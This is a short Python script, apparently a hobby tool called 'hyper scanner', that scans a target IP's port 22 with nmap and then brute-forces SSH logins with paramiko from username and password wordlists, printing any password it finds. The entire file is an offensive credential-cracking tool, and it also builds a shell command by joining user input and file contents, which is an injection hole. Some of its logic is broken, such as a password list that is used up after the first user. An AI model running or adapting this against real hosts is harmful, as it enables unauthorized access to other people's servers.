#!/bin/python3

# main menu function

import subprocess
import paramiko
import sys

global port
global ip, user, password, passfile, userfile, host, pass1
global rest, opt, pass1, count
global comad
global HostStatus
global opt2


def ssh_connect(ip, user, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=ip, username=user, password=password)
    except paramiko.AuthenticationException:
        print("[*] nope")
        ssh.close()
    except KeyboardInterrupt:
        print ("[-] cracking is still going on ")
        opt2 = input("Do YOU want to CONTINUE ? [Y/N]")
        if opt2 == 'Y':
            print ("[-] exiting")
            sys.exit(0)
        else:
            print("[*] CONTINUING")
    else:
        print ("[*] Found password:" + password)


def ssh_brute(ip):
    passfile = open("crackpass.txt", "r")
    count = 0
    userfile = open("crackuser.txt", "r")
    for line in userfile.readlines():
        user = line.strip('\n')
        for line in passfile.readlines():
            password = line.strip('\n')
            count += 1
            cnt = str(count)
            line = "[-] Attempt " + cnt + ": " + password + user + " ..."
            print(line)
            ssh_connect(ip, user, password)

            

def scanner(comad, ip):
    result = subprocess.getoutput(comad)
    if result == "Up":
        print("up")
        ssh_brute(ip)
    else:
        print("host is down")
    return ip


def cmdmake(ip):
    port = str(22)
    print ("starting nmap scan")
    rest = open("commd.txt", "r")
    rest1 = str(rest.read())
    comad = "nmap -p " + port + " -Pn -oG - " + ip + rest1
    scanner(comad, ip)
    return comad, ip


def main():
    print ("Welcome to hyper scanner ")
    print ("IT IS RECOMMENDED TO USE THIS SCRIPT AS SUDO")
    print ("[1]NMAP ssh scan  plus ssh brute force")
    opt = int(input('Type the option: '))
    if opt == 0:
        ip = input('type ip address: ')
    elif opt == 1:
        ip = str(input('type ip address: '))
        cmdmake(ip)
        return ip
    elif opt == 2:
        ip = input('type ip address: ')
    else:
        print("invalid option")


if __name__ == '__main__':
    main()
